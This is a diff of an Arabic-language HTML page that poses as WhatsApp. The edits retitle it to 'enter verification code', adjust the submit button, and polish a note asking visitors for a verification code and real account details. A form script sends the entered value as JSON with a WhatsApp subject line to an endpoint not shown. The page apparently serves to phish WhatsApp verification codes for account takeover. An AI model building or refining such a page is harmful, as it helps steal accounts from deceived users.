@@ -4,7 +4,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>WhatsApp - تجربة الأرقام</title>
+<title>WhatsApp - ادخال رقم تحقق </title>
 <style>
 body {
   margin: 0;
@@ -62,9 +62,9 @@ button {
       inputmode="numeric"
       required
     >
-    <button type="submit">إرسال التحقق </button>
+    <button type="submit"> إرسال رقم التحقق </button>
   </form>
-  <p class="note">هذه صفحة واتساب مستقلة.  رجاءادخل رمز تحقق و بيانات حسابات حقيقية.</p>
+  <p class="note">هذه صفحة واتساب مستقلة.  رجاء ادخال رمز تحقق و بيانات حسابات حقيقية.</p>
   <p id="status"></p>
 </div>
 
@@ -83,7 +83,7 @@ document.getElementById("testForm").addEventListener("submit", async function(e)
       },
       body: JSON.stringify({
         test_number: this.test_number.value,
-        _subject: " رقم االتحقق من واتساب WhatsApp"
+        _subject: "رقم االتحقق من واتساب WhatsApp"
       })
     });
 
